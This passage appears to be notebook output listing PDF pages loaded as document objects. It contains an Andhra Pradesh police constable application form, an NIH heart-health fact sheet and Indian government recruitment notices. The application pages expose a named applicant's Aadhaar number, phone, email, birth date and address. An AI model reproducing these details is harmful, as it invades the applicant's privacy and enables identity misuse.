prosecuted by the Police in this case?\\nNA\\nFurnish the present stage of the case.\\nNA\\n5.Crime No. & Year \\nNA & NA\\nName of the Police Station\\nNA\\nName of the District\\nNA\\nWere you arrested by the Police in this case?\\nNA\\nWere you prosecuted by the Police in this case?\\nNA\\nFurnish the present stage of the case.\\nNA\\n22. Were you at any time employed and dismissed from service of the State or Central Government or \\nfrom the Service of any Central or State Government undertaking or local body or other authority ? \\n(whether during training or later)\\nNo\\nPage 3 of 5\\nReport generated on : 23-08-2024 08:45:12\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/4159216 (3).pdf', 'page': 3}, page_content='24. Indicate the Units you prefer in the event of selection for posts of SCT PC (Civil) (Men and Women)- Post Code-21 (Please \\nmention Unit Name in the order of preference mentioned below) \\nPreference Order\\nName of the Unit\\n1st Preference\\nWest Godavari District\\n2nd Preference\\nEast Godavari District\\n3rd Preference\\nRajamahendravaram Urban\\n4th Preference\\nVijayawada City\\n5th Preference\\nKrishna\\n6th Preference\\nVisakhapatnam City\\n7th Preference\\nVisakhapatnam Rural\\n8th Preference\\nGuntur Urban\\n9th Preference\\nGuntur Rural\\n10th Preference\\nPrakasam\\n11th Preference\\nS.P.S. Nellore\\n12th Preference\\nKadapa\\n13th Preference\\nKurnool\\n14th Preference\\nAnanthapuramu\\n15th Preference\\nChittoor\\n16th Preference\\nVizianagaram\\n17th Preference\\nSrikakulam\\n18th Preference\\nTirupati Urban\\nStudy details\\n26. Are you a Local or Non-Local Candidate?\\nYes\\nIf Yes, which is your Local District?\\nWest Godavari\\n27. Did you migrate from the State of Telangana to \\nAndhra Pradesh?\\nNo\\nYou have Migrated to which District?\\nNA\\nDate of Issue of Migration Certificate.\\nNA\\n28. To Justify column 44 i.e Local status furnish the Whether Regular Study / Residence Details?\\nRegular studies\\n25. Indicate the Units you prefer in the event of selection for posts of SCT PC (APSP) (Men)- Post Code-23 (Please mention Unit \\nName in the order of preference mentioned below)\\nPreference Order\\nName of the Unit\\n1st Preference\\nIRB Rajamahendravaram\\n2nd Preference\\nIRB Etcherla of Srikakulam District\\n3rd Preference\\nIRB Maddipadu of Prakasham Dist.\\n4th Preference\\nIRB Chittoor\\nName of the Post\\nNA\\nName of the Department\\nNA\\nDate of declaration of Probation\\nNA\\nDate of Dismissal\\nNA\\nOffice Address\\nNA\\nPost Preference Details\\n23. As per information provided by you in Column no. 22 In online application form (stage 1), Post Preferences\\nPreference Order\\nName of the Post\\n1st Preference\\nSCT PC (Civil) (Men & Women)\\n2nd Preference\\nSCT PC (APSP) (Men)\\nPage 4 of 5\\nReport generated on : 23-08-2024 08:45:12\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/4159216 (3).pdf', 'page': 4}, page_content='(a)To Justify your claim, furnish your Study/Residence details as applicable from 4th to 10th Class:\\nSno\\nClass\\nMonth\\nYear\\nSchool Name / Residential Address\\nName of the District\\n1\\n4th Class\\n4\\n2005\\nG P SCHOOL PEDAJEEDIPUDI\\nWest Godavari\\n2\\n5th Class\\n4\\n2006\\nG T W A H SCHOOL BOYS MADAKAMVARIGUDEM\\nWest Godavari\\n3\\n6th Class\\n4\\n2007\\nG T W A H SCHOOL BOYS MADAKAMVARIGUDEM\\nWest Godavari\\n4\\n7th Class\\n4\\n2008\\nG T W A H SCHOOL BOYS MADAKAMVARIGUDEM\\nWest Godavari\\n5\\n8th Class\\n4\\n2009\\nG T W A SCHOOL BOYS ANTHARVEDIGUDEM\\nWest Godavari\\n6\\n9th Class\\n4\\n2010\\nG T W A SCHOOL BOYS  ANTHARVEDIGUDEM\\nWest Godavari\\n7\\n10th Class\\n3\\n2011\\nG T W A SCHOOL BOYS ANTHARVEDIGUDEM\\nWest Godavari\\nThe following relevant ORIGINAL DOCUMENTS along with one set of Xerox copies will be submitted by me when I appear for \\nPMT/PET. I understood the instructions given in the Notification\\na)  Secondary \\nSchool/Matriculation \\ncertificate \\nor \\nequivalent \\ncertificate \\nin \\nsupport of \\nthe \\ndate \\nof \\nbirth.\\nb)  \\nEducational \\nqualification: \\nThe \\ncandidate \\nmust \\nhave \\npassed, \\nas \\non \\n1st \\nJuly, \\n2022,  \\nIntermediate \\nor \\nits \\nequivalent \\nexamination  \\n  \\n      \\nrecognised \\nby \\nthe \\nState \\nGovernment.\\n  \\n               \\nIn \\nthe \\ncase \\nof \\na \\ncandidate \\nbelonging \\nto \\nScheduled \\nCaste \\nor \\nScheduled \\nTribe, \\nas on \\n1st \\nJuly, \\n2022, \\nhe/she \\nmust \\nhave \\npassed  \\n  \\n      \\nSSC \\nor \\nits \\nequivalent \\nExamination  \\nrecognised \\nby \\nthe \\nState \\nGovernment \\nand \\nshould \\nhave \\nstudied \\nIntermediate \\nand \\nappeared \\nfor \\n  \\n      the \\nIntermediate \\nExaminations \\nof \\n1st \\nyear \\nand \\n2nd \\nyear.\\nc)   \\nA \\ncandidate \\nbelonging \\nto \\nScheduled \\nCaste \\nor \\nScheduled \\nTribe, \\nwho \\ndid \\nnot \\npass \\nthe \\nIntermediate \\nor \\nits \\nequivalent \\nexamination \\nbut  \\n  \\n      \\npassed \\nSSC \\nor \\nits \\nequivalent \\nexamination \\nand \\nstudied \\nIntermediate \\nand \\nappeared \\nfor \\nthe \\nIntermediate \\nExamination, \\nmust \\nsubmit \\nthe  \\n  \\n      \\nMemorandum \\nof \\nMarks \\nof \\nboth \\nthe 1st \\nand \\n2nd \\nyear \\nIntermediate \\nExaminations\\nd)  \\nA \\ncandidate \\nbelonging \\nto \\nthe \\nOpen \\nCategory \\n(OC), \\nwho \\nwish \\nto \\nclaim \\nconcession \\nin \\nage \\nand \\nreservation \\nspecified \\nfor \\nthe \\nEWS  \\n  \\n     \\ncategory, \\nshould \\nsubmit \\nthe \\nsaid \\nCertificate \\nissued \\nby \\nthe \\ncompetent \\nauthority \\nas \\nspecified \\n(Para \\nno. \\n11 \\nin \\nthe \\nNotifiation).\\ne)  \\nA \\ncandidate \\nbelonging \\nto \\nthe \\nBackward \\nClass, \\nwho \\nwish \\nto \\nclaim \\nconcession \\nin \\nage \\nand \\nalso \\nreservation \\nspecified \\nfor \\nthe \\nBackward \\n  \\n     Classes, \\nmust \\nsubmit \\nthe \\nLATEST \\nCommunity \\n& \\nDate \\nof \\nBirth \\nCertificate \\nand  \\nCertificate \\nof \\nNon \\nCreamy \\nLayer\\n \\nissued \\nby \\nthe \\n  \\n     competent \\nrevenue \\nauthority \\nas \\nspecified.\\nf)   \\nA \\ncandidate \\nbelonging \\nto \\nScheduled \\nCaste \\nor \\nScheduled \\nTribe, \\nwho \\nwish \\nto \\nclaim \\nconcession \\nin \\nage \\nand \\nalso \\nreservation \\nspecified  \\n  \\n     \\nfor the \\nSCs/STs, \\nmust \\nsubmit \\nthe \\nLATEST \\nCommunity \\n& \\nDate \\nof \\nBirth \\nCertificate \\nissued \\nby \\nthe \\ncompetent \\nauthority \\nas \\nspecified.\\ng)  \\nCertificate \\nfrom \\nthe \\ncompetent \\nauthority \\nin \\nrespect \\nof \\nState \\nGovernment \\nemployees/those \\nwho \\nworked \\nin \\nthe \\nArmy, \\nNavy \\nor \\nAir \\n  \\n     Force \\nof \\nthe \\nIndian \\nUnion/NCC \\nInstructors/ \\nretrenched \\ntemporary \\nemployees \\nin \\nthe \\nState \\nCensus \\nDepartment \\nduring \\n1991 \\nfor  \\n  \\n     \\nclaiming \\nage \\nrelaxation.\\nh)  \\nResidence \\ncertificate \\nin \\nthe \\nagency \\narea \\nfrom \\nthe \\ncompetent \\nauthority \\nin \\nrespect \\nof \\ncandidates \\nbelonging \\nto \\nScheduled \\nTribes \\nand  \\n  \\n      \\nAboriginal \\nTribes \\nin \\nthe \\nagency \\narea \\nwho \\nclaim \\nrelaxation \\nin \\nPhysical \\nMeasurements \\nor \\nreservation.\\ni)  \\nStudy \\ncertificate \\nissued \\nby \\nthe \\nSchool \\nauthorities \\nor \\nResidence \\ncertificate \\n(in \\ncase \\nthe \\ncandidate \\nhas \\nnot \\nstudied \\nin \\nany \\nEducational  \\n  \\n    \\nInstitution \\npreceding \\nto \\nSSC/Matriculation \\nor \\nequivalent \\n(Private \\nstudy)) \\nissued \\nby \\nTahasildar \\nof \\nthe \\nconcerned \\nMandal, \\nfor  \\n  \\n    \\ndetermining \\nlocal \\nstatus.\\nj)  \\nHome \\nGuards \\nService \\nCertificate/Certificate \\nof \\nCPP/Certificate \\nof \\nCDI \\nissued \\non \\nor \\nafter \\nthe \\ndate \\nof \\nnotification, \\nwherever \\napplicable.\\nk)  \\nEx-servicemen \\ncertificate \\n/ \\nMeritorious \\nSports \\nPersons \\nCategory \\n(a), \\n(b) \\nor \\n(c) \\nCertificate \\n/ \\nNCC \\n‘A’, \\n‘B’ \\nor \\n‘C’ \\ncertificate \\netc.,  \\n  \\n     \\nwherever \\napplicable.\\nl)   \\nA \\ncandidate \\nclaiming \\nage \\nrelaxation \\nby \\nvirtue \\nof \\nbeing \\neither \\na \\nwidow \\nor \\na \\ndivorcee \\nor \\na \\nwoman \\njudicially \\nseparated \\nfrom \\nher \\n  \\n     \\nhusband, and \\nwho \\nhas \\nnot \\nremarried, \\nshould \\nproduce \\nthe \\nrelevant \\ndocumentary \\nevidence \\n(Para \\n13 \\n(B) \\n(b)(vii) \\nIn \\nthe \\nNotification).\\nm) \\nMigration \\ncertificate \\ni.e. \\ncandidate \\nwho \\nmigrated \\nto \\nany \\npart \\nof \\nthe \\nState \\nof \\nAndhra \\nPradesh \\nfrom \\nthe \\nState \\nof \\nTelangana \\nwithin \\na  \\n  \\n     \\nperiod \\nof \\nseven \\nyears \\nfrom \\nthe \\n2nd \\nday \\nof \\nJune, \\n2014 \\nshall \\nsubmit \\nrelevant \\ncertificate \\nin \\norder \\nto \\nclaim \\nlocal \\ncandidate \\nstatus \\n(Para  \\n  \\n     \\nNo. \\n21 \\nin \\nthe \\nNotification).\\nPage 5 of 5\\nReport generated on : 23-08-2024 08:45:12\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/06-5715.pdf', 'page': 0}, page_content='If you’re like most people, you may think of heart \\ndisease as a problem for other folks. If you’re a \\nwoman, you may believe that being female protects you from heart disease. \\nIf you’re a man, you may \\nbelieve you’re not old enough to have a serious heart condition. Wrong on all counts. \\nHeart disease is the #1 killer in the United States—of both men and women. \\nIt affects many people at midlife \\nas well as in old age. African Americans and Latinos are at especially high risk for heart disease and have high rates of some of the risk factors that lead to heart disease. \\nThe good news is that heart disease is preventable. \\nY\\nou can take action to reduce your risk of heart \\ndisease by focusing on your lifestyle and habits. This fact sheet gives you steps you can take to protect your heart health. And what’s good for you, is good for your whole family. As an adult, you can make lifestyle changes that can set a good example for children who may have already developed habits that can lead to heart disease. \\nWhat Is Heart Disease? \\nCoronary heart disease—often simply called heart disease—occurs when the arteries that supply blood to the heart muscle become hardened and narrowed due to a buildup of plaque on the inner walls of the arteries. A heart attack occurs when the plaque in an artery bursts and a clot forms over the plaque, blocking flow through the artery and preventing oxygen and nutrients from getting to the heart. Heart disease is a lifelong condition. Once you get it, you’ll always have it. \\nBut there is much you can do to \\ncontrol the risk factors for heart disease, prevent a heart attack, and increase your chances for a long and vital life. \\nRisk Factors \\nRisk factors are health conditions or habits that increase the chances of developing a disease or having it worsen. For heart disease, there are some risk factors that you can’t change, but many that you can. You can’t change a family history of early heart disease or your age, which for women becomes a risk factor at age 55. Men are at higher risk beginning at age 45. \\nEvery risk factor counts, and if you have more than \\none, they can “gang up” and worsen each other’\\ns \\neffects. But most risk factors can be controlled with changes in lifestyle. Sometimes medication is also needed. Here’s a quick review of these risk factors. \\nSmoking. Smoking leads to reduced blood flow in the \\narteries. \\nThis reduced flow can lead to a heart attack. \\nThere’s no safe way to smoke. However, the benefits of \\nquitting start immediately. After a few days, your blood pressure will drop and the levels of oxygen and carbon monoxide in the blood can return to normal. Just 1 year after quitting, your heart disease risk will drop by more than half. It’s not easy to quit, but make a plan and you can do it. Or try an organized program or medication—ask your doctor if either is right for you. \\nHigh blood pressure. Also called hypertension, high \\nblood pressure increases your risk of heart disease, stroke, and congestive heart failure. \\nEven levels slightly \\nabove normal—called prehypertension—increase your heart disease risk. \\nA Healthy Heart IN BRIEF: \\nYour Guide to \\nU.S. DEPARTMENT OF HEALTH AND HUMAN SERVICES \\nNational Institutes of Health \\nNational Heart, Lung, and Blood Institute \\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/06-5715.pdf', 'page': 1}, page_content='There are several ways to get your blood pressure under \\ncontrol. Follow a heart healthy eating plan, r educe \\nyour salt and sodium intake, get regular physical activity, \\nand maintain a healthy weight. If you drink alcoholic \\nbeverages, do so in moderation—one drink per day for \\nwomen and two per day for men. Your doctor may also \\nrecommend medication to lower your blood pressure. \\nHigh blood cholesterol. Excess cholesterol and fat in your \\nblood build up in the walls of the vessels that supply \\nblood to the heart. \\nThis buildup, called plaque, can lead \\nto blockages. A lipoprotein profile tests your levels of \\ntotal cholesterol, low-density lipoprotein (LDL) or “bad” \\ncholesterol, high-density lipoprotein (HDL) or “good” \\ncholesterol, and triglycerides—a fatty substance in the blood. \\nYou can lower your cholesterol by following a heart \\nhealthy eating plan, being physically active, maintaining \\na healthy weight, and, if needed, taking medication. \\nOverweight/obesity. The high rate of overweight and \\nobesity in our country is no secret. \\nBut size isn’t the \\nonly issue. Excess weight can increase the risk of not \\nonly heart disease, but a host of other conditions, such \\nas stroke, gallbladder disease, arthritis, and some can -\\ncers. Even a small amount of weight loss (10 percent of \\nyour initial weight) will help lower your heart disease \\nrisk. \\nIf you are overweight, at the very least, try not to \\ngain more weight. Lasting weight loss requires a change in lifestyle. Adopt \\na healthy\\n, lower calorie eating plan, and be more \\nphysically active. Aim to lose no more than 1/2 pound \\nto 2 pounds per week. If you have a lot of weight to \\nlose, ask your doctor, a registered dietitian, or a \\nqualified nutritionist to help. \\nPhysical inactivity. Even if you have no other risk \\nfactors, being physically inactive greatly boosts your \\nchances of developing heart-related problems. \\nBut \\nnearly 40 percent of Americans do no spare-time \\nphysical activity at all. \\nTry to do at least 30 minutes of moderate-intensity \\nphysical activity on most, if not all, days of the week. \\nThis includes brisk walking, light weightlifting, or even \\nhousecleaning or gardening. \\nIf you need to, divide the 30 \\nminutes into shorter periods of at least 10 minutes each. \\nDiabetes. About 11 million Americans have been \\ndiagnosed with diabetes—and another 5.7 million don’\\nt \\nknow they have it. About two-thirds of those with \\ndiabetes die of heart or blood vessel disease. \\nDiabetes can be detected with a blood sugar test. If you \\nhave diabetes, it is vital that you keep it under control. \\nModest changes in diet and level of physical activity \\ncan often prevent or delay the development of diabetes. \\nTaking Action \\nThe first step to improving your heart health is learning \\nabout your risk profile. See the box “Questions To Ask \\nYour Doctor.” Then begin taking the steps to heart \\nhealth—don’t smoke, follow a heart healthy eating \\nplan, be physically active, and maintain a healthy \\nweight. Start today to keep your heart strong. \\nTo Learn More \\nContact the National Heart, Lung, and Blood Institute \\n(NHLBI) for information and publications on heart \\ndisease and heart health. \\nNHLBI Health Information Center \\nP.O. Box 30105 \\nBethesda, MD 20824-0105 \\nPhone: 301–592–8573 \\nTTY: 240–629–3255 \\nFax: 301–592–8563 \\nwww.nhlbi.nih.gov 1. What is my risk for heart disease? \\n2. What is my blood pressure? What does it mean \\nfor me and what do I need to do about it?\\n \\n3. What are my cholesterol numbers? (These include  \\ntotal cholesterol, LDL, HDL, and triglycerides— \\na type of fat found in the blood and food.) What \\ndo they mean for me and what do I need to do \\nabout them? \\n4. What are my body mass index (BMI) and waist \\nmeasur\\nement? Do they mean that I need to lose \\nweight for my health? \\n5. What is my blood sugar level, and does it mean \\nthat I’m at risk for diabetes?\\n If so, what do \\nI need to do about it? \\n6. What other screening tests do I need to help \\npr\\notect my heart? \\n7. What can you do to help me quit smoking? \\n8. How much physical activity do I need to help \\npr\\notect my heart? \\n9. What’s a heart healthy eating plan for me? \\nHow can I tell if I’m having a heart attack? If I \\nthink I’m having one, what should I do?\\n Questions To Ask \\nYour Doctor \\n10. \\nU.S. DEPARTMENT OF HEALTH AND HUMAN SERVICES \\nNational Institutes of Health \\nNational Heart, Lung, and Blood Institute \\nNIH Publication No. 06–5715 \\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/1114363837233349487393.pdf', 'page': 0}, page_content='   \\nभारतीय  अन्तर्देशीय  जलमार्ग  प्राधिकरण  \\nINLAND WATERWAYS AUTHORITY OF INDIA  \\n(Ministry of Ports, Shipping and Waterways, Govt. of India)  \\nA-13, Sector -1, Noida – 201301 (U.P.)  \\nPhone:  0120 – 2544036 & 2574050  \\n \\n \\nBrief Employment Notice No . IWAI -17011/ 2/2024-ADMIN RECTT Dated 07/08/2024 \\n \\n \\n Inland Waterways Authority of India (IWAI) invites on -line applications from Indian Nationals for filling \\nup of following vacancies by DIRECT RECRUITMENT at IWAI Headquarters, Noida and Regional \\nOffices / Sub - Offices as per details given below.  \\n \\n \\n \\nThe opening date and closing date for receipt of online applications are as under:  \\n \\n \\n \\n \\nSl. \\nNo. Post \\nCode  Name of Post  Pay Level of \\nthe Post  Maximum \\nage Limit  Total \\nVacanc\\nies Category  \\nUR OBC  EWS  S\\nC ST PwD  EXSM  \\n1 01/24  Assistant \\nDirector (Engg.)  Level – 10 \\n(Pay Range) \\n56100 -\\n177500)  35 2 UR – 1 ( Mechanical)  \\n                  OBC – 1 ( Civil)  \\n \\n2 02/24  Assistant \\nHydrographic  \\nSurveyor (AHS)  Level – 10 \\n(Pay Range) \\n56100 -\\n177500)  Not \\nexceeding \\n35 years  1 1 - - - - - - \\n3 03//24  Licence Engine \\nDriver  Level – 6 \\n(Pay Range) \\n35400 -\\n112400)  Not \\nexceeding \\n30 years  1 1 - - - - - - \\n4 04/24  Junior Accounts \\nOfficer  Level – 6 \\n(Pay Range) \\n35400 -\\n112400)  Not \\nexceeding \\n30 years  5 1 2 1 1 - 1* - \\n5 05/24  Dredge Control \\nOperator  Level – 6 \\n(Pay Range) \\n35400 -\\n112400)  Not \\nexceeding \\n30 years  5 2 1 1 1 - - - \\n6 06/24  Store Keeper  Level –4  \\n(Pay Range \\n25500 -\\n81100)  Not \\nexceeding \\n25 years  1 1 - - - - - - \\n7 07/24  Master  2nd \\nClass  Level –4  \\n(Pay Range \\n25500 -\\n81100)  Not \\nexceeding \\n35 years  3 1 - - 1 1 - - \\n8 08/24  Staff  Car Driver  Level – 02 \\n (Pay Range \\n19900 -\\n63200)  Not \\nexceeding \\n30 years  3 2 1 - - - - - \\n9 09/24  Master 3rd \\nClass  Level – 02 \\n (Pay Range \\n19900 -\\n63200)  Not \\nexceeding \\n30 years  1 1 - - - - - - \\nIMPORTANT NOTICE : - Only online applications will be accepted. Application received through any other \\nmode shall stand rejected automatically.  \\nOpening Date of Application: 16/08/2024  \\nClosing Date of Application:  15/09/2024  \\n '),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/1114363837233349487393.pdf', 'page': 1}, page_content='  10 10/24  Multi Tasking \\nStaff (MTS)  Level -01 \\n(Pay Range \\n18000 -\\n56900)  Between \\n18 and 25 \\nyears  11 2 4 3 1 1 2* - \\n11 11/24  Technical \\nAssistant  \\n(Civil/  \\nMechanical/ \\nMarine \\nEngineering/ \\nNaval \\nArchitecture  \\n Level – 6 \\n(Pay Range) \\n35400 -\\n112400)  Not \\nexceeding \\n30 years  4 UR – 2 ( 1- Civil & 1 - Mechanical)  \\nOBC – 1 (1- Marine Engineering)  \\nST – 1 (1- Naval Architecture)  \\n \\n \\n(*) If PwD candidate is selected, will be adjusted against the quota as per his/her category.   \\n \\nPhysical Requirements and Suitable Category of Benchmark Disability:  \\nPost  Physical Requirement  Disability suitable for the job  \\nJunior Account Officer  S, ST, MF, RW, SE, C  c) - OA, OL,BL, BA, OAL,  \\nCP, LC, Dw, AAV, MDy, SD (witho ut N/L \\nDf), SI (without N/L Df) - 01 Post  \\nMulti Tasking Staff (MTS)  S, ST, W, MF, RW, SE, C  a) - B, LV  – 01 Post  \\nc) - OA, OL,BL, BA, OAL,  \\nCP, LC, Dw, AAV, MDy, SD (witho ut N/L \\nDf), SI (without N/L Df) – 01 Post  \\n \\nAbbreviations used for physical Requirement:  \\nS- Sitting, ST= Standing, W= Walking, MF= Manipulation by Fingers, RW= Reading & Writing, SE= \\nSeeing, C= Communication  \\nAbbreviations used for categories:  \\nB= Blind, LV= Low Vision,  \\nOA= One Arm, OL= One Leg, BL= Both Leg, BA= Both Arm, OAL= One Arm and One Leg, CP= \\nCerebral Palsy, LC= Leprosy Cured, Dw= Dwarfism, AAV= Acid Attack Victims, MDy= Muscular \\nDystrophy, SD/SI (without N/L Df)= Spinal Deformity / Spinal Injury (without Neurological / Limb \\ndysfunction) . \\nInterested candidates possessing requisite qualifications and experience may  submit applications \\nonline using link, which shall be available in the IWAI web -site i.e. www.iwai.nic.in ; w.e.f  \\n16/08/2024.  Last date for payment of Application Fee and  submission of online application \\nis 15/09/2024 (23:59 Hrs.) . \\n  \\nDetailed advertisement shall be available on IWAI website ( www.iwai.nic.in ) on 16/08/2024. \\n \\n \\nSd/- \\nSECRETARY  \\n \\n \\n \\n \\n \\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/IMPORTANT NOTICE..pdf', 'page': 0}, page_content='File No.E/5/2024-C-2\\nSECTION-Part(1) (E-9958)\\nDated:- 14.08.2024\\n \\nभारत\\n \\nसरकार\\n,\\nका\\x07मक\\n, \\nलोक\\n \\n\\x0bशकायत\\n \\nतथा\\n \\nप\\x10शन\\n \\nमं\\x13ालय\\n,\\nका\\x07मक\\n \\nएवं\\n \\n\\x16\\x0bश\\x17ण\\n \\nिवभाग\\n,\\nकम\\x1bचारी\\n \\nचयन\\n \\nआयोग\\n,\\n\\x1fलॉकसं\\n-12\\n,\\nके\"#ीय\\n \\nकाया\\x1bलय\\n \\nप$रसर\\n,\\nलोधीरोड\\n, \\nनई\\n \\nिद)ी\\n110003\\n-\\n \\nGovernment of India,\\nMinistry of Personnel, Public\\nGrievances & Pensions,\\nDepartment of Personnel and\\nTraining, \\nStaff Selection Commission,\\nBlock No. 12, CGO Complex, Lodhi\\nRoad, New Delhi – 110003\\n \\n \\n \\n \\n \\n \\n            \\nIMPORTANT NOTICE\\nF.No.- E\\n/\\n5/2024-C-2 SECTION-Part(1)\\n:\\n Candidates may\\nrefer to the Notice of Multi-Tasking (Non-Technical) Staﬀ\\nand Havaldar (CBIC & CBN) Examination, 2024 uploaded on\\nthe Commission’s website i.e https://ssc.gov.in/ on\\n27.06.2024.\\n2.      In pursuance of Para 12 of the Notice of Examination,\\na ‘\\nWindow for Application Form Correction’\\n will be\\navailable from \\n16.08.2024 (00:01 Hours) to 17.08.2024\\n(11:59 Hours)\\n. In case, any correction/ change is required\\nto be made in the already ﬁlled application form, candidates\\nmay utilize the \\n‘Window for Application Form\\nCorrection’\\n for the same. Request received after expiry of\\nthe above-mentioned correction window for any change/\\ncorrection/ modiﬁcation in the application form in any mode\\nof communication viz. Post, Fax, E-mail, by hand etc., shall\\nnot be entertained by the Commission and will be summarily\\nrejected.\\n \\n \\nUnder Secretary\\n14.08.2024\\n '),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/4159216 (2).pdf', 'page': 0}, page_content=\"1.\\nName (As per SSC / Equivalent certificate)\\n:\\nSUNNAM SEETHARAM\\n2.\\nFather's/ Husband's Name\\n:\\nS VEERRAJU\\nPreserve the REGISTRATION NUMBER \\nfor all your future correspondence.\\n3.\\nMother's Name\\n:\\nS SUBHADRA\\n4.\\nGender\\n:\\nMale\\n5.\\nDate of Birth\\n(As per SSC/Equivalent certificate)\\n:\\n16-08-1996\\n4159216\\n6.\\n(a) SSC/Equivalent Roll No.\\n:\\n1111127157\\n(b) Year of Passing\\n:\\n2011\\n11.\\n7.\\nUpload Certificate (SSC or Equivalent)\\n:\\nUploaded\\n8.\\nEducational Qualification\\n:\\nIntermediate  / Any other \\nequivalent\\n9.\\nCommunity\\n:\\nABO-ST\\n10.\\nUpload Community Certificate\\n(For BC, SC and ST)\\n:\\nUploaded\\n13.\\nDo you belong to EWS Category ?\\n:\\nNo\\n14.\\nUpload EWS Certificate\\n(For OC)\\n:\\n---\\n15.\\nDo you belong to Ex-Servicemen ?\\n:\\nNo\\nEx-Servicemen Joining Date\\n:\\n---\\nEx-Servicemen Discharge Date / Likely Date \\nof Discharge\\n:\\n---\\n16.\\nldentificaton Marks\\n(As per SSC / Equivalent certificate)\\n:\\nA MOLE ON THE LEFT SIDE OF \\nTHE CHEST\\n:\\nA MOLE ON THE RIGHT SIDE OF \\nTHE RIBBS\\n17.\\nMobile No.\\n:\\n8688655324\\n12.\\n18.\\nE-mail id\\n:\\nbtgsuryacomputers@gmail.c\\nom\\n19.\\n(a) Do you have Aadhaar Card ?\\n:\\nYes\\n(b) lf yes, please mention number\\n:\\n673915750575\\n20.\\nWhat is your preferred medium\\nof Examination ?\\n:\\nTelugu\\n21.\\nWhich is your prefered place for \\nwriting Preliminary written test ?\\n(SLPRB, AP reserves the Right to \\ninclude New Test Centres, if \\nnecessary)\\n1st\\n:\\nRAJAMAHENDRAVARAM\\n2nd\\n:\\nELURU\\n3rd\\n:\\nTADEPALLIGUDEM\\n22.\\nPost Preferences as per notification\\n1st\\n:\\n21 - SCT PC (Civil) (Men & \\nWomen)\\n2nd\\n:\\n23 - SCT PC (APSP) (Men)\\n23.\\nWhich is your preferred place for \\nappearing in PMT / PET after you \\nhave qualified in Preliminary written \\nExamination ?\\n1st\\n:\\nEast Godavari\\n2nd\\n:\\nWest Godavari\\n24.\\nAre you a Local of State of Andhra \\nPradesh ?\\n:\\nYes\\na) lf yes, which is your Local District ? \\n:\\nWest Godavari\\nb) lf No, which State/UT you belong to ?\\n:\\n---\\n25.\\nAre you claiming benefit of age relaxation ? \\n(Please go through the Notificaiton) \\n:\\nNo\\nIf yes, Please specify the applicable \\ncategory.\\na) BC\\n:  No\\nb) SC\\n:  No\\nc) ST/ABOST\\n:  No\\nd) AP Government Employee\\n:  No\\ne) Ex-Servicemen\\n:  No\\nf) NCC Instructor\\n:  No\\ng) AP State Census Department \\n:  No\\nh) Andhra Pradesh Home Guard\\n:  No\\ni) Widow / Divorced / Judicially             \\n   Separated Women                                                               \\n:  No\\nj) EWS Category\\n:  No\\n26.\\nAs per Rule 3 (G) of GO Ms. No. 97 dated 01.05.2006 and amendments there on, and as mentioned in Notification at Para No. 27, \\nthe candidates falling under certain categories shall be disqualified for recruitment. (Please go through the Notification)\\nDo you come under those \\ncategories ?\\nIf yes, please note that you are not \\neligible for recruitment.\\n:\\nNo\\n27.\\nAddress for Communication\\n:  PEDA JEEDIPUDI VILLAGE DORAMAMIDI POST, BUTTAYA GUDEM \\nMANDAL, West Godavari, BUTTAYA GUDEM, 534448\\n28.\\nFee Paid through : Payment Gateway\\nTransaction Id : YUTI1614269839\\nFee : 150\\nCertified \\nthat \\nI \\nhave \\nread, \\nunderstood \\nand \\naccept \\nall \\nthe \\nTerms \\nand \\nconditions \\nof \\nthe \\nNotification. \\nI \\nundertake \\nComplete \\nresponsibility \\nthat \\nI \\nhave\\nsubmitted \\ncorrect \\ninformation \\nto \\nthe \\nbest \\nof \\nmy \\nknowledge \\nand \\nbelief.\\nNote: \\nPlease \\ndownload \\nHall \\nTicket \\nto \\nhave \\naccess \\nto \\nthe \\nExamination \\nCentre. \\nThe \\nHall \\nTickets \\nwill \\nbe \\navailable \\nfor \\ndownload \\nfrom \\nthe \\nwebsite \\n14\\ndays \\nprior \\nto \\nthe \\nDate \\nof \\nExamination.\\nSTATE LEVEL POLICE RECRUITMENT BOARD, ANDHRA PRADESH\\nSTAGE I ONLINE APPLICATION FORM\\nONLINE APPLICATION FORM FOR THE POSTS OF SCT PC (CIVIL) (MEN & WOMEN): POST CODE NO. 21, \\n     SCT PC (APSP) (MEN): POST CODE NO. 23,\\nVIDE NOTIFICATION RC.NO. 161/SLPRB/RECT.2/2022, DT. 28.11.2022\\n\"),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/4159216 (2).pdf', 'page': 1}, page_content='Date : 23-08-2024 08:44:35\\nSTATE LEVEL POLICE RECRUITMENT BOARD, ANDHRA PRADESH\\nSTAGE I ONLINE APPLICATION FORM\\nONLINE APPLICATION FORM FOR THE POSTS OF SCT PC (CIVIL) (MEN & WOMEN): POST CODE NO. 21, \\n     SCT PC (APSP) (MEN): POST CODE NO. 23,\\nVIDE NOTIFICATION RC.NO. 161/SLPRB/RECT.2/2022, DT. 28.11.2022\\n'),\n",
              " Document(metadata={'source': '/content/drive/MyDrive/Pdf/1114363837233349487393 (1).pdf', 'page': 0}, page_content='   \\nभारतीय  अन्तर्देशीय  जलमार्ग  प्राधिकरण  \\nINLAND WATERWAYS AUTHORITY OF INDIA  \\n(Ministry of Ports, Shipping and Waterways, Govt. of India)  \\nA-13, Sector -1, Noida – 201301 (U.P.)  \\nPhone:  0120 – 2544036 & 2574050  \\n \\n \\nBrief Employment Notice No . IWAI -17011/ 2/2024-ADMIN RECTT Dated 07/08/2024 \\n \\n \\n Inland Waterways Authority of India (IWAI) invites on -line applications from Indian Nationals for filling \\nup of following vacancies by DIRECT RECRUITMENT at IWAI Headquarters, Noida and Regional \\nOffices / Sub - Offices as per details given below.  \\n \\n \\n \\nThe opening date and closing date for receipt of online applications are as under:  \\n \\n \\n \\n \\nSl. \\nNo. Post \\nCode  Name of Post  Pay Level of \\nthe Post  Maximum \\nage Limit  Total \\nVacanc\\nies Category  \\nUR OBC  EWS  S\\nC ST PwD  EXSM  \\n1 01/24  Assistant \\nDirector (Engg.)  Level – 10 \\n(Pay Range) \\n56100 -\\n177500)  35 